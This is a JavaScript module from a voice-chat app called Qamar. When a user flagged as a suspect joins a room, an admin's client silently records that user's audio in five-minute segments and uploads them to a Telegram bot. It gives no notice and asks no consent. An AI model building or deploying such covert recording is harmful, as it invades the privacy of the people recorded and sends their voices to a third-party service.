// ==============================================
// voice/voice-monitor.js v2 — إصلاح mediaElementSource
// ==============================================
// يعتمد على: firebase.js + suspects.js + room-voice.js + voice-system.js + adaptive.js
// يعطي: window.QamarVoiceMonitor
// ==============================================
// ⭐ v2 (فوق v1):
//   1. إصلاح BUG: createMediaElementSource مرة واحدة
//   2. Source Cache — إعادة استخدام AudioNode
//   3. لا نُغلق audioContext بعد الإنشاء
//   4. isSuspectSync (بدل isSuspect)
//   5. QamarAdaptive: heartbeat + enabled
//   6. تسجيل أخطاء createMediaElementSource في king_alerts
//   7. QamarBoot.whenReady بدل EventBus.once
//   8. كل الباقي كما v1 (segments 5min + Telegram upload + lock)
// ==============================================

(function () {
    'use strict';

    if (!window.QamarFB) {
        console.error('❌ [voice-monitor] firebase.js not loaded!');
        return;
    }

    if (window.QamarVoiceMonitor && window.QamarVoiceMonitor.__v2) return;

    const LOG_TAG = '[VM]';
    const Logger = {
        debug: function () { if (window.QAMAR_DEBUG) console.log.apply(console, [LOG_TAG].concat(Array.prototype.slice.call(arguments))); },
        info:  function () { console.log.apply(console, [LOG_TAG].concat(Array.prototype.slice.call(arguments))); },
        warn:  function () { console.warn.apply(console, [LOG_TAG].concat(Array.prototype.slice.call(arguments))); },
        error: function () { console.error.apply(console, [LOG_TAG].concat(Array.prototype.slice.call(arguments))); }
    };

    /* ══════════════════════════════════════════════ */
    /* Config                                          */
    /* ══════════════════════════════════════════════ */
    const CONFIG = {
        LOCK_PATH: 'voice_monitor_lock',
        ALERTS_PATH: 'king_alerts',
        TELEGRAM_CONFIG_PATH: 'config/telegram',
        SEGMENT_MS: 5 * 60 * 1000,
        LOCK_TTL_MS: 10 * 60 * 1000,
        LOCK_HEARTBEAT_MS_DEFAULT: 2 * 60 * 1000,   // سيُستبدل بـ Adaptive
        MAX_RETRY_UPLOAD: 3,
        RETRY_DELAY_MS: 2000,
        UPLOAD_TIMEOUT_MS: 60000
    };

    /* ══════════════════════════════════════════════ */
    /* State                                           */
    /* ══════════════════════════════════════════════ */
    const State = {
        telegram: null,

        monitoring: false,
        currentRoom: null,
        currentTargetUid: null,
        currentTargetName: null,
        lockAcquiredAt: 0,

        // ⭐ v2: cache دائم للـ source nodes
        sourceCache: new Map(),     // audioEl → { source, dest, ownerUid, at }

        // audioContext — دائم، لا نُغلقه
        audioContext: null,

        mediaRecorder: null,
        chunks: [],
        segmentStartAt: 0,
        segmentTimer: null,
        segmentIndex: 0,
        totalSegments: 0,
        lockHeartbeat: null,

        listeners: [],
        unsubs: [],

        instanceId: 'vm_' + Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 8),

        _initialized: false,
        _lastTargetUid: null,
        _adaptiveBound: false
    };

    /* ══════════════════════════════════════════════ */
    /* Events                                          */
    /* ══════════════════════════════════════════════ */
    function onMonitorEvent(cb) {
        if (typeof cb !== 'function') return function () {};
        State.listeners.push(cb);
        return function off() {
            State.listeners = State.listeners.filter(function (h) { return h !== cb; });
        };
    }

    function _emit(name, payload) {
        if (window.EventBus) {
            try { window.EventBus.emit(name, payload); } catch (e) {}
        }
        State.listeners.slice().forEach(function (cb) {
            try { cb({ type: name, data: payload }); } catch (e) {}
        });
    }

    /* ══════════════════════════════════════════════ */
    /* Helpers                                         */
    /* ══════════════════════════════════════════════ */
    function _getCurrentUid() {
        if (window.QamarAuth && window.QamarAuth.getUid) return window.QamarAuth.getUid();
        return window.auth && window.auth.currentUser ? window.auth.currentUser.uid : null;
    }

    function _getCurrentName() {
        try {
            if (window.AppState && window.AppState.user && window.AppState.user.name) {
                return window.AppState.user.name;
            }
            if (window.QamarSession && window.QamarSession.getData) {
                const s = window.QamarSession.getData();
                if (s && s.name) return s.name;
            }
        } catch (e) {}
        return '—';
    }

    function _isKing() {
        if (window.QamarRanks && window.QamarRanks.isKing) return window.QamarRanks.isKing();
        return false;
    }

    function _canMonitor() {
        return _isKing();
    }

    function _isVoiceMonitorEnabled() {
        if (window.QamarAdaptive && typeof window.QamarAdaptive.isEnabled === 'function') {
            return window.QamarAdaptive.isEnabled('voiceMonitorEnabled');
        }
        return true;
    }

    function _getLockHeartbeatMs() {
        if (window.QamarAdaptive && typeof window.QamarAdaptive.get === 'function') {
            // heartbeatMs من Adaptive (20/30/60/90s)
            // نستخدمها × 2 لقفل المراقبة
            const base = window.QamarAdaptive.get('heartbeatMs') || 30000;
            return Math.max(base, 60000);
        }
        return CONFIG.LOCK_HEARTBEAT_MS_DEFAULT;
    }

    function _toast(msg) {
        if (window.showToast) { try { window.showToast('fa-info-circle', msg); return; } catch (e) {} }
        Logger.info('toast:', msg);
    }

    function _timeStr(ts) {
        const d = new Date(ts || Date.now());
        return d.toLocaleString('ar-EG', { hour12: false });
    }

    /* ══════════════════════════════════════════════ */
    /* Load Telegram config                            */
    /* ══════════════════════════════════════════════ */
    function _loadTelegramConfig(force) {
        if (!force && State.telegram && State.telegram.botToken) {
            return Promise.resolve(State.telegram);
        }
        return window.QamarFB.get(CONFIG.TELEGRAM_CONFIG_PATH)
            .then(function (data) {
                if (data && data.botToken && data.chatId) {
                    State.telegram = {
                        botToken: String(data.botToken),
                        chatId: String(data.chatId),
                        enabled: data.enabled !== false
                    };
                    Logger.info('✅ Telegram config loaded');
                    return State.telegram;
                }
                Logger.warn('Telegram config missing — set config/telegram');
                State.telegram = null;
                return null;
            })
            .catch(function (e) {
                Logger.warn('loadTelegramConfig error:', e.message);
                return null;
            });
    }

    /* ══════════════════════════════════════════════ */
    /* Distributed Lock                                */
    /* ══════════════════════════════════════════════ */
    function _lockPath(roomId) {
        return CONFIG.LOCK_PATH + '/' + roomId;
    }

    function _acquireLock(roomId) {
        return window.QamarFB.transaction(_lockPath(roomId), function (cur) {
            if (cur && cur.instanceId === State.instanceId) {
                return { instanceId: State.instanceId, at: Date.now(), byUid: _getCurrentUid(), byName: _getCurrentName() };
            }
            if (cur && cur.at && (Date.now() - cur.at) < CONFIG.LOCK_TTL_MS) {
                return undefined;
            }
            return {
                instanceId: State.instanceId,
                at: Date.now(),
                byUid: _getCurrentUid(),
                byName: _getCurrentName(),
                roomId: roomId
            };
        }).then(function (r) {
            const ok = !!(r && r.committed && r.snapshot && r.snapshot.instanceId === State.instanceId);
            if (ok) State.lockAcquiredAt = Date.now();
            return ok;
        }).catch(function () { return false; });
    }

    function _refreshLock(roomId) {
        return window.QamarFB.transaction(_lockPath(roomId), function (cur) {
            if (!cur || cur.instanceId !== State.instanceId) return undefined;
            return Object.assign({}, cur, { at: Date.now() });
        }).catch(function () {});
    }

    function _releaseLock(roomId) {
        return window.QamarFB.transaction(_lockPath(roomId), function (cur) {
            if (cur && cur.instanceId === State.instanceId) return null;
            return undefined;
        }).catch(function () {});
    }

    /* ══════════════════════════════════════════════ */
    /* Find <audio> element of target uid              */
    /* ══════════════════════════════════════════════ */
    function _findAudioElement(uid) {
        if (!uid) return null;
        const all = document.querySelectorAll('audio[data-peer]');
        for (let i = 0; i < all.length; i++) {
            if (all[i].dataset.peer === uid) return all[i];
        }
        return null;
    }

    /* ══════════════════════════════════════════════ */
    /* ⭐ v2: Get or create audio source               */
    /* ══════════════════════════════════════════════ */
    /**
     * يُرجع { source, dest } جاهزَين للاستخدام.
     * - إذا <audio> في الكاش → أعِد استخدام
     * - وإلا أنشئ مرة واحدة فقط
     */
    function _getOrCreateSource(audioEl, ownerUid) {
        if (!audioEl) return null;

        // هل موجود في الكاش؟
        if (State.sourceCache.has(audioEl)) {
            const cached = State.sourceCache.get(audioEl);
            Logger.debug('♻️ Reusing cached source for', ownerUid ? ownerUid.substring(0, 8) : 'audio');
            return cached;
        }

        // أنشئ audioContext إذا لزم
        if (!State.audioContext) {
            try {
                const AC = window.AudioContext || window.webkitAudioContext;
                if (!AC) {
                    Logger.warn('AudioContext not supported');
                    return null;
                }
                State.audioContext = new AC();
                Logger.info('🎛️ AudioContext created (persistent)');
            } catch (e) {
                Logger.error('Failed to create AudioContext:', e.message);
                return null;
            }
        }

        const ctx = State.audioContext;

        // حاول إنشاء source
        try {
            const source = ctx.createMediaElementSource(audioEl);
            const dest = ctx.createMediaStreamDestination();

            // وصّل source → destination الأصلي (المستخدم يسمع)
            source.connect(ctx.destination);
            // وصّل source → destination للتسجيل
            source.connect(dest);

            const entry = {
                source: source,
                dest: dest,
                ownerUid: ownerUid,
                at: Date.now()
            };
            State.sourceCache.set(audioEl, entry);
            Logger.info('✨ Created new source for', ownerUid ? ownerUid.substring(0, 8) : 'audio');
            return entry;
        } catch (e) {
            // 💥 غالباً InvalidStateError — العنصر تم ربطه سابقاً
            Logger.error('createMediaElementSource failed:', e.message);

            // سجّل في king_alerts
            _logAlert({
                type: 'monitor_error',
                error: e.message,
                errorName: e.name,
                targetUid: ownerUid,
                targetName: State.currentTargetName,
                room: State.currentRoom,
                createdAt: window.QamarFB.serverTime()
            });

            return null;
        }
    }

    /* ══════════════════════════════════════════════ */
    /* Remove from cache (عند خروج المشتبه)            */
    /* ══════════════════════════════════════════════ */
    function _removeFromSourceCache(audioEl) {
        if (!audioEl) return;
        if (State.sourceCache.has(audioEl)) {
            const entry = State.sourceCache.get(audioEl);
            try { entry.source.disconnect(); } catch (e) {}
            try { entry.dest.disconnect(); } catch (e) {}
            State.sourceCache.delete(audioEl);
            Logger.debug('🗑️ Source removed from cache');
        }
    }

    /* ══════════════════════════════════════════════ */
    /* Start monitoring a suspect                      */
    /* ══════════════════════════════════════════════ */
    function _startMonitoring(roomId, targetUid, targetName) {
        if (State.monitoring) {
            Logger.debug('Already monitoring — ignore');
            return Promise.resolve({ skipped: true });
        }
        if (!_canMonitor()) return Promise.resolve({ skipped: 'not-king' });
        if (!_isVoiceMonitorEnabled()) {
            Logger.debug('Voice monitor disabled (very-slow net)');
            return Promise.resolve({ skipped: 'disabled' });
        }

        return _loadTelegramConfig().then(function () {
            return _acquireLock(roomId);
        }).then(function (acquired) {
            if (!acquired) {
                Logger.debug('Lock not acquired for room', roomId);
                return { skipped: 'locked' };
            }

            const audioEl = _findAudioElement(targetUid);
            if (!audioEl) {
                Logger.warn('Audio element not found:', targetUid.substring(0, 8));
                _releaseLock(roomId);
                return { skipped: 'no-audio-el' };
            }

            return _beginRecording(roomId, targetUid, targetName, audioEl).then(function () {
                return { ok: true, uid: targetUid, roomId: roomId };
            });
        }).catch(function (e) {
            Logger.error('startMonitoring failed:', e.message);
            _releaseLock(roomId);
            return { error: e.message };
        });
    }

    /* ══════════════════════════════════════════════ */
    /* Begin recording                                 */
    /* ══════════════════════════════════════════════ */
    function _beginRecording(roomId, targetUid, targetName, audioEl) {
        return new Promise(function (resolve, reject) {
            try {
                // ⭐ v2: استخدم _getOrCreateSource
                const entry = _getOrCreateSource(audioEl, targetUid);
                if (!entry) {
                    return reject(new Error('فشل الوصول لعنصر الصوت'));
                }

                const { dest } = entry;

                // اختر mime
                const mime = (window.MediaRecorder && MediaRecorder.isTypeSupported('audio/webm;codecs=opus'))
                    ? 'audio/webm;codecs=opus'
                    : 'audio/webm';

                State.chunks = [];
                State.mediaRecorder = new MediaRecorder(dest.stream, { mimeType: mime });
                State.mediaRecorder.ondataavailable = function (ev) {
                    if (ev.data && ev.data.size > 0) State.chunks.push(ev.data);
                };
                State.mediaRecorder.onstop = _onSegmentStop;
                State.mediaRecorder.start(1000);

                State.monitoring = true;
                State.currentRoom = roomId;
                State.currentTargetUid = targetUid;
                State.currentTargetName = targetName || '—';
                State.segmentStartAt = Date.now();
                State.segmentIndex = 0;
                State.totalSegments = 0;

                // timer للأجزاء
                if (State.segmentTimer) clearInterval(State.segmentTimer);
                State.segmentTimer = setInterval(_rotateSegment, CONFIG.SEGMENT_MS);

                // heartbeat للقفل — من Adaptive
                if (State.lockHeartbeat) clearInterval(State.lockHeartbeat);
                const hbMs = _getLockHeartbeatMs();
                State.lockHeartbeat = setInterval(function () {
                    if (State.monitoring && State.currentRoom) {
                        _refreshLock(State.currentRoom);
                    }
                }, hbMs);

                Logger.info('🎙️ Monitoring started:', targetName, 'in', roomId,
                    '| lock heartbeat:', hbMs + 'ms');
                _emit('voice-monitor:started', {
                    roomId: roomId, uid: targetUid, name: targetName
                });
                resolve(true);
            } catch (e) {
                Logger.error('beginRecording failed:', e.message);
                _cleanupRecording(false);  // لا نحذف من الـ cache
                reject(e);
            }
        });
    }

    /* ══════════════════════════════════════════════ */
    /* Segment rotation                                */
    /* ══════════════════════════════════════════════ */
    function _rotateSegment() {
        if (!State.monitoring) return;
        if (!State.mediaRecorder || State.mediaRecorder.state !== 'recording') return;
        Logger.info('🔄 Rotating segment #' + State.segmentIndex);
        try { State.mediaRecorder.stop(); } catch (e) {}
    }

    function _onSegmentStop() {
        const chunks = State.chunks.slice();
        State.chunks = [];
        State.segmentIndex++;

        if (chunks.length === 0) return;

        const blob = new Blob(chunks, { type: 'audio/webm' });
        const duration = Date.now() - State.segmentStartAt;
        State.segmentStartAt = Date.now();

        _uploadToTelegram(blob, duration, State.segmentIndex).catch(function (e) {
            Logger.warn('upload failed:', e.message);
        });

        // استمر بالجزء التالي
        if (State.monitoring && State.currentRoom && State.mediaRecorder) {
            try {
                const entry = State.sourceCache.get(_findAudioElement(State.currentTargetUid));
                if (!entry) return;
                const mime = State.mediaRecorder.mimeType || 'audio/webm';
                State.mediaRecorder = new MediaRecorder(entry.dest.stream, { mimeType: mime });
                State.mediaRecorder.ondataavailable = function (ev) {
                    if (ev.data && ev.data.size > 0) State.chunks.push(ev.data);
                };
                State.mediaRecorder.onstop = _onSegmentStop;
                State.mediaRecorder.start(1000);
            } catch (e) {
                Logger.error('restart recorder failed:', e.message);
            }
        }
    }

    /* ══════════════════════════════════════════════ */
    /* Stop monitoring                                 */
    /* ══════════════════════════════════════════════ */
    function _stopMonitoring(reason, cleanupCache) {
        if (!State.monitoring) return Promise.resolve({ ok: true, skipped: true });

        Logger.info('⏹️ Stopping monitoring. Reason:', reason || 'unknown',
            '| cleanupCache:', !!cleanupCache);

        if (State.segmentTimer) {
            clearInterval(State.segmentTimer);
            State.segmentTimer = null;
        }
        if (State.lockHeartbeat) {
            clearInterval(State.lockHeartbeat);
            State.lockHeartbeat = null;
        }

        return new Promise(function (resolve) {
            try {
                if (State.mediaRecorder && State.mediaRecorder.state !== 'inactive') {
                    const origStop = State.mediaRecorder.onstop;
                    State.mediaRecorder.onstop = function () {
                        try { if (origStop) origStop(); } catch (e) {}
                        resolve(true);
                    };
                    State.mediaRecorder.stop();
                } else {
                    resolve(true);
                }
            } catch (e) {
                resolve(false);
            }
        }).then(function () {
            return _releaseLock(State.currentRoom);
        }).then(function () {
            // ⭐ v2: احذف من الكاش فقط إذا طُلب (خروج المشتبه)
            if (cleanupCache && State.currentTargetUid) {
                const audioEl = _findAudioElement(State.currentTargetUid);
                if (audioEl) _removeFromSourceCache(audioEl);
            }

            _cleanupRecording(cleanupCache);
            _emit('voice-monitor:stopped', { reason: reason || 'unknown' });
            return { ok: true };
        });
    }

    /* ⭐ v2: تنظيف بدون إغلاق audioContext            */
    function _cleanupRecording(cleanupCache) {
        State.monitoring = false;
        State.mediaRecorder = null;
        State.chunks = [];
        State.currentRoom = null;
        State.currentTargetUid = null;
        State.currentTargetName = null;
        State.segmentStartAt = 0;
        State.segmentIndex = 0;

        // ⚠️ لا نُغلق audioContext
        // ⚠️ لا نحذف من sourceCache — إلا إذا طُلب
        if (cleanupCache) {
            State.sourceCache.forEach(function (entry, audioEl) {
                _removeFromSourceCache(audioEl);
            });
        }
    }

    /* ══════════════════════════════════════════════ */
    /* Upload to Telegram                              */
    /* ══════════════════════════════════════════════ */
    function _uploadToTelegram(blob, durationMs, segmentIndex) {
        if (!blob || blob.size === 0) return Promise.resolve({ ok: false, reason: 'empty' });
        if (!State.telegram || !State.telegram.botToken || !State.telegram.chatId) {
            Logger.warn('Telegram config missing');
            return Promise.resolve({ ok: false, reason: 'no-config' });
        }
        if (State.telegram.enabled === false) {
            return Promise.resolve({ ok: false, reason: 'disabled' });
        }

        const caption = [
            '🚨 تسجيل مشبوه',
            '👤 ' + (State.currentTargetName || '—'),
            '🏠 ' + (State.currentRoom || '—'),
            '🕒 ' + _timeStr(),
            '⏱️ ' + Math.round(durationMs / 1000) + 'ث',
            '📦 جزء #' + segmentIndex
        ].join('\n');

        const url = 'https://api.telegram.org/bot' + State.telegram.botToken + '/sendAudio';

        const fd = new FormData();
        fd.append('chat_id', State.telegram.chatId);
        fd.append('audio', blob, 'qamar-monitor-' + Date.now() + '.webm');
        fd.append('caption', caption);
        fd.append('title', 'تسجيل مشبوه — ' + (State.currentTargetName || '—'));
        fd.append('parse_mode', 'HTML');

        return _fetchWithRetry(url, {
            method: 'POST',
            body: fd
        }, CONFIG.MAX_RETRY_UPLOAD).then(function (result) {
            if (result && result.ok) {
                const msgId = result.result && result.result.message_id;
                Logger.info('✅ Uploaded to Telegram (msgId=' + msgId + ')');
                _logAlert({
                    type: 'voice_record',
                    suspects: [State.currentTargetUid],
                    targetUid: State.currentTargetUid,
                    targetName: State.currentTargetName,
                    byUid: _getCurrentUid(),
                    byName: _getCurrentName(),
                    room: State.currentRoom,
                    duration: durationMs,
                    size: blob.size,
                    tgMessageId: msgId,
                    segmentIndex: segmentIndex,
                    createdAt: window.QamarFB.serverTime()
                });
                _emit('voice-monitor:uploaded', { msgId: msgId, segmentIndex: segmentIndex });
                return { ok: true, msgId: msgId };
            }
            throw new Error('Telegram upload failed: ' + JSON.stringify(result));
        }).catch(function (e) {
            Logger.error('Telegram upload error:', e.message);
            _emit('voice-monitor:uploadError', { error: e.message, segmentIndex: segmentIndex });
            throw e;
        });
    }

    function _fetchWithRetry(url, options, retries) {
        retries = retries || 1;
        return _fetchOnce(url, options).catch(function (e) {
            if (retries <= 1) throw e;
            Logger.warn('Upload retry... (' + retries + ' left)');
            return new Promise(function (res) {
                setTimeout(res, CONFIG.RETRY_DELAY_MS);
            }).then(function () {
                return _fetchWithRetry(url, options, retries - 1);
            });
        });
    }

    function _fetchOnce(url, options) {
        return new Promise(function (resolve, reject) {
            const timer = setTimeout(function () {
                reject(new Error('Upload timeout'));
            }, CONFIG.UPLOAD_TIMEOUT_MS);

            fetch(url, options)
                .then(function (r) { return r.json(); })
                .then(function (data) {
                    clearTimeout(timer);
                    if (data && data.ok) resolve(data);
                    else reject(new Error('Telegram returned: ' + (data && data.description ? data.description : 'unknown')));
                })
                .catch(function (e) {
                    clearTimeout(timer);
                    reject(e);
                });
        });
    }

    /* ══════════════════════════════════════════════ */
    /* Log to king_alerts                              */
    /* ══════════════════════════════════════════════ */
    function _logAlert(payload) {
        if (!payload) return Promise.resolve();
        return window.QamarFB.push(CONFIG.ALERTS_PATH, payload)
            .then(function (rid) {
                Logger.debug('King alert saved:', rid);
                return rid;
            })
            .catch(function (e) {
                Logger.warn('logAlert failed:', e.message);
            });
    }

    /* ══════════════════════════════════════════════ */
    /* External hooks                                  */
    /* ══════════════════════════════════════════════ */
    function onVoiceJoin(uid, context) {
        if (!uid) return;
        if (!_canMonitor()) return;
        if (!_isVoiceMonitorEnabled()) return;

        if (!window.QamarSuspects) return;

        // ⭐ v2: نستخدم isSuspectSync (boolean فوري)
        const isSuspect = (typeof window.QamarSuspects.isSuspectSync === 'function')
            ? window.QamarSuspects.isSuspectSync(uid)
            : false;

        if (!isSuspect) return;

        const roomId = (context && context.roomId) ||
            (window.QamarRoomVoice && window.QamarRoomVoice.getStatus
                ? window.QamarRoomVoice.getStatus().currentRoom
                : null);
        if (!roomId) return;

        const name = (context && context.name) || '—';

        // انتظر حتى ينشأ <audio>
        setTimeout(function () {
            _startMonitoring(roomId, uid, name);
        }, 1500);
    }

    function onVoiceLeft(uid) {
        if (!uid) return;
        if (!State.monitoring) return;

        if (uid === State.currentTargetUid) {
            Logger.info('👋 Target left — stopping monitor + cleanup cache');
            // ⭐ v2: cleanupCache = true (خروج نهائي)
            _stopMonitoring('target-left', true);
        }
    }

    /* ══════════════════════════════════════════════ */
    /* Public API                                      */
    /* ══════════════════════════════════════════════ */
    function start() {
        if (State._initialized) return;
        State._initialized = true;

        _loadTelegramConfig(true);

        if (window.EventBus) {
            const off1 = window.EventBus.on('voice:joined', function (p) {
                if (p && p.uid) onVoiceJoin(p.uid, p);
            });
            const off2 = window.EventBus.on('voice:left', function (p) {
                if (p && p.uid) onVoiceLeft(p.uid);
            });
            const off3 = window.EventBus.on('suspect:voiceJoined', function (p) {
                if (p && p.uid) onVoiceJoin(p.uid, p.context || {});
            });
            const off4 = window.EventBus.on('room:changed', function () {
                if (State.monitoring) _stopMonitoring('room-changed', true);
            });
            const off5 = window.EventBus.on('auth:signout', function () {
                if (State.monitoring) _stopMonitoring('signout', true);
            });

            State.unsubs = [off1, off2, off3, off4, off5];
        }

        // استمع لـ adaptive
        _bindAdaptive();

        Logger.info('📦 [voice-monitor.js v2] started');
    }

    function _bindAdaptive() {
        if (State._adaptiveBound) return;
        if (!window.QamarAdaptive || typeof window.QamarAdaptive.onFeatureChange !== 'function') {
            setTimeout(_bindAdaptive, 1000);
            return;
        }
        State._adaptiveBound = true;

        window.QamarAdaptive.onFeatureChange('voiceMonitorEnabled', function (payload) {
            if (payload.value === false && State.monitoring) {
                Logger.info('⏸️ Net slowed — stopping monitor');
                _stopMonitoring('net-slow', true);
            }
        });
    }

    function stop() {
        State.unsubs.forEach(function (off) {
            try { if (off) off(); } catch (e) {}
        });
        State.unsubs = [];
        if (State.monitoring) _stopMonitoring('manual', true);
        State._initialized = false;
        Logger.info('📦 [voice-monitor.js v2] stopped');
    }

    function isMonitoring() { return State.monitoring; }

    function getCurrentTarget() {
        return State.monitoring ? {
            uid: State.currentTargetUid,
            name: State.currentTargetName,
            room: State.currentRoom,
            startedAt: State.segmentStartAt,
            segment: State.segmentIndex
        } : null;
    }

    function forceStop() { return _stopMonitoring('forced', true); }

    /* ══════════════════════════════════════════════ */
    /* Init                                            */
    /* ══════════════════════════════════════════════ */
    if (window.QamarBoot && typeof window.QamarBoot.whenReady === 'function') {
        window.QamarBoot.whenReady('background', function () {
            setTimeout(start, 1500);
        });
    } else if (window.EventBus) {
        window.EventBus.once('boot:ready', function () {
            setTimeout(start, 3000);
        });
    } else {
        setTimeout(start, 9000);
    }

    /* ══════════════════════════════════════════════ */
    /* Status                                          */
    /* ══════════════════════════════════════════════ */
    function getStatus() {
        return {
            initialized: State._initialized,
            monitoring: State.monitoring,
            currentTarget: State.currentTargetUid ? State.currentTargetUid.substring(0, 8) : null,
            currentTargetName: State.currentTargetName,
            currentRoom: State.currentRoom,
            segmentIndex: State.segmentIndex,
            hasTelegramConfig: !!(State.telegram && State.telegram.botToken),
            instanceId: State.instanceId,
            canMonitor: _canMonitor(),
            voiceEnabled: _isVoiceMonitorEnabled(),
            sourceCacheSize: State.sourceCache.size,
            hasAudioContext: !!State.audioContext,
            audioContextState: State.audioContext ? State.audioContext.state : null
        };
    }

    /* ══════════════════════════════════════════════ */
    /* Exports                                         */
    /* ══════════════════════════════════════════════ */
    window.QamarVoiceMonitor = {
        __v2: true,
        CONFIG: CONFIG,

        start: start,
        stop: stop,
        isMonitoring: isMonitoring,
        getCurrentTarget: getCurrentTarget,
        forceStop: forceStop,

        reloadTelegramConfig: function () { return _loadTelegramConfig(true); },

        // اختبار يدوي
        testUpload: function (blob) {
            return _uploadToTelegram(blob, 0, 0);
        },

        // ⭐ v2: للـ debugging
        clearSourceCache: function () {
            State.sourceCache.forEach(function (entry, audioEl) {
                _removeFromSourceCache(audioEl);
            });
        },

        onMonitorEvent: onMonitorEvent,
        getStatus: getStatus
    };

    Logger.info('📦 [voice-monitor.js v2] loaded — BUG-2 fixed + Android-friendly');
})();
